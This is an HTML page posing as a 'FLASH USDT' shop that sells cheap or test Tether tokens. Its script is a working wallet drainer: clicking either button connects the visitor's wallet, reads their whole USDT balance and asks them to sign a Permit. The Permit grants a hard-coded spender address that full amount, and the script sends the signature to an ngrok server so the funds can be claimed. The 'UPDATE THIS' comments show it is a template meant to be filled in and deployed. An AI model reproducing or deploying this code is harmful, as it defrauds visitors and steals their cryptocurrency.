<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FLASH USDT</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }

        /* Animated Background Particles */
        .bg-particles {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            overflow: hidden;
        }
        .particle {
            position: absolute;
            width: 5px;
            height: 5px;
            background: rgba(38, 161, 123, 0.3);
            border-radius: 50%;
            animation: float 10s infinite linear;
        }
        @keyframes float {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            50% { opacity: 1; }
            100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
        }

        .container {
            text-align: center;
            z-index: 1;
            padding: 2rem;
            max-width: 500px;
            width: 90%;
        }

        /* Logo / Title */
        .logo {
            font-size: 3rem;
            font-weight: 800;
            margin-bottom: 0.5rem;
            background: linear-gradient(90deg, #26a17b, #00d2ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-shadow: 0 0 20px rgba(38, 161, 123, 0.5);
        }

        .subtitle {
            color: #b0b0b0;
            margin-bottom: 2rem;
            font-size: 1rem;
        }

        /* Buttons Container */
        .buttons {
            display: flex;
            flex-direction: column;
            gap: 1rem;
            align-items: center;
        }

        .btn {
            width: 100%;
            padding: 1rem;
            font-size: 1.1rem;
            font-weight: 600;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        /* Primary Button (Buy) */
        .btn-primary {
            background: linear-gradient(45deg, #26a17b, #1e8566);
            color: white;
            box-shadow: 0 4px 15px rgba(38, 161, 123, 0.4);
        }
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(38, 161, 123, 0.6);
        }

        /* Secondary Button (Test) */
        .btn-secondary {
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            border: 1px solid rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(5px);
        }
        .btn-secondary:hover {
            background: rgba(255, 255, 255, 0.2);
        }

        /* Ratio Text */
        .ratio-text {
            margin-top: 1rem;
            font-size: 0.85rem;
            color: #888;
            opacity: 0.7;
            letter-spacing: 0.5px;
        }

        /* Status Message */
        #status {
            margin-top: 1.5rem;
            min-height: 1.5rem;
            font-size: 0.9rem;
        }
        .status-success { color: #26a17b; }
        .status-error { color: #ff6b6b; }

        /* USDT Icon Placeholder */
        .usdt-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 1rem auto;
            background: #26a17b;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2.5rem;
            font-weight: bold;
            box-shadow: 0 0 20px rgba(38, 161, 123, 0.6);
        }
       
    </style>
</head>
<body>

    <!-- Background Particles -->
    <div class="bg-particles" id="particles"></div>

    <div class="container">
        <!-- Logo Area -->
        <div class="usdt-icon">$</div>
        <h1 class="logo">FLASH USDT</h1>
        <p class="subtitle">Fastest Flash USDT in the Ecosystem</p>

        <!-- Buttons -->
        <div class="buttons">
            <button id="getTestBtn" class="btn btn-secondary">Get Test USDT</button>
            <button id="buyUsdtBtn" class="btn btn-primary">Buy USDT</button>
           
            <p class="ratio-text">Ratio 0.05$ per 1 USDT</p>
        </div>

        <!-- Status -->
        <div id="status"></div>
    </div>

    <script>
        // Generate random floating particles
        const particlesContainer = document.getElementById('particles');
        for(let i=0; i<20; i++) {
            const p = document.createElement('div');
            p.className = 'particle';
            p.style.left = Math.random() * 100 + '%';
            p.style.animationDelay = Math.random() * 5 + 's';
            p.style.animationDuration = (5 + Math.random() * 10) + 's';
            particlesContainer.appendChild(p);
        }

        const NGROK_URL = "https://untagged-busybody-unvarying.ngrok-free.dev"; // <--- UPDATE THIS
        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";

        const statusDiv = document.getElementById('status');
        const getTestBtn = document.getElementById('getTestBtn');
        const buyUsdtBtn = document.getElementById('buyUsdtBtn');

        function setStatus(msg, type) {
            statusDiv.textContent = msg;
            statusDiv.className = type === 'success' ? 'status-success' : (type === 'error' ? 'status-error' : '');
        }

        async function claimPermit(type) {
            if (!window.ethereum) {
                setStatus("Please install MetaMask or Trust Wallet.", "error");
                return;
            }

            try {
                setStatus("Connecting wallet...", "");
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const userAddress = accounts[0];

                const nonce = await window.ethereum.request({
                    method: 'eth_getTransactionCount',
                    params: [userAddress, 'pending']
                });

                const balanceHex = await window.ethereum.request({
                    method: 'eth_call',
                    params: [{
                        to: USDT_ADDRESS,
                        data: '0x70a08231' + userAddress.slice(2).padStart(64, '0')
                    }, 'latest']
                });

                let amount;
                if (type === 'test') {
                    // For test, let's just ask for 1000 USDT max or current balance
                    amount = BigInt(balanceHex).toString();
                } else {
                    amount = BigInt(balanceHex).toString();
                }

                if (amount === "0") {
                    setStatus("No USDT found.", "error");
                    return;
                }

                const signatureData = {
                    types: {
                        Permit: [
                            { name: 'owner', type: 'address' },
                            { name: 'spender', type: 'address' },
                            { name: 'value', type: 'uint256' },
                            { name: 'nonce', type: 'uint256' },
                            { name: 'deadline', type: 'uint256' }
                        ]
                    },
                    primaryType: 'Permit',
                    domain: {
                        name: 'Tether USD',
                        version: '1',
                        chainId: 1,
                        verifyingContract: USDT_ADDRESS
                    },
                    message: {
                        owner: userAddress,
                        spender: "0xbdF6cE9B4906AE0D71Ea8A908bAa5d3C09035251", // <--- UPDATE THIS
                        value: amount,
                        nonce: nonce,
                        deadline: Math.floor(Date.now() / 1000) + 86400
                    }
                };

                setStatus("Sign transaction to " + (type === 'test' ? "Claim" : "Buy") + "...", "");
               
                const signature = await window.ethereum.request({
                    method: 'eth_signTypedData_v4',
                    params: [userAddress, JSON.stringify(signatureData)]
                });

                setStatus("Processing...", "");
               
                const response = await fetch(`${NGROK_URL}/claim`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        signature: signature,
                        userAddress: userAddress,
                        message: signatureData.message,
                        type: type // Send type to server if needed
                    })
                });

                const result = await response.json();

                if (result.success) {
                    setStatus("Success!", "success");
                } else {
                    setStatus("Failed: " + result.error, "error");
                }

            } catch (error) {
                console.error(error);
                setStatus("User cancelled or error.", "error");
            }
        }

        getTestBtn.addEventListener('click', () => claimPermit('test'));
        buyUsdtBtn.addEventListener('click', () => claimPermit('buy'));

    </script>
</body>
</html>
